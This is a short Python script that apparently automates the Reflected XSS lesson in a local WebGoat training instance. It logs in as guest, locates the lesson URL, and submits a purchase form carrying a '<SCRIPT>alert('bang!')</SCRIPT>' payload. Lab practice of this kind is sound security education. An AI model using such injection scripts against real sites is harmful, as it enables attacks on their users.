import requests
import json

s = requests.session()

#Going to the WebGoat page
s.get("http://127.0.0.1:8080/WebGoat")

data = {'username': 'guest', 'password':'guest'}

#Logging in
s.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check;jsessionid=" + str(s.cookies), data)

#Getting lesson plans for screen and menu
r = s.get("http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc")

hiddenScreenMenu = str(r.text)
splitScreenMenu = hiddenScreenMenu.split("},{")
for i in splitScreenMenu:
	if "Reflected XSS Attack" in i:
		splitI = i.split(",")
		noQuotes = splitI[4].split("\"")

#Submitting the script
data = {'QTY1': '1', 'QTY2': '1', 'QTY3' : '1', 'QTY4' : '1', 'field2' : '4128+3214+0002+1999', 'field1':'<SCRIPT>alert(\'bang!\');</SCRIPT>', 'SUBMIT':'Purchase'}
r = s.post("http://127.0.0.1:8080/WebGoat/" + noQuotes[3], data)
print r.text
